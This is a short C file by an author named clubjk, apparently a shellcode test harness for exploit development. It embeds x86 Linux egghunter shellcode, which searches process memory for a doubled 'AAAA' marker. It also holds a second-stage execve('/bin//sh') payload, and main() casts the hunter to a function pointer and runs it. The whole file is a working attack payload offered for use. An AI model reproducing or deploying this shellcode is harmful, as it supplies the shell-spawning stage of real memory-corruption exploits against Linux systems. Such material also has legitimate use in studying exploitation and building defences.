/*
Egghunter Shellcode
shellcode.
Author: clubjk
*/

#include<stdio.h>
#include<string.h>

#define EGG "\x41\x41\x41\x41" //AAAA

char egg[] = EGG;

unsigned char egg_hunter[] = \


//jk's egghunter from nasm
"\xfc\x31\xc0\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\xb8\x21\x00\x00\x00\xcd\x80\x3c\xf2\x74\xec\xb8"
EGG
"\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7";


unsigned char second_stage[] = \
                                EGG 
                                EGG 
//jk's execve shellcode                               
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";


main()
{
  printf("[+] Searching for: %s\n", EGG);
  printf("[+] Egg Hunter Length: %d\n", strlen(egg_hunter));
  printf("[+] Shellcode Length: %d\n", strlen(second_stage));
  int (*ret)() = (int(*)())egg_hunter;
  ret();
}

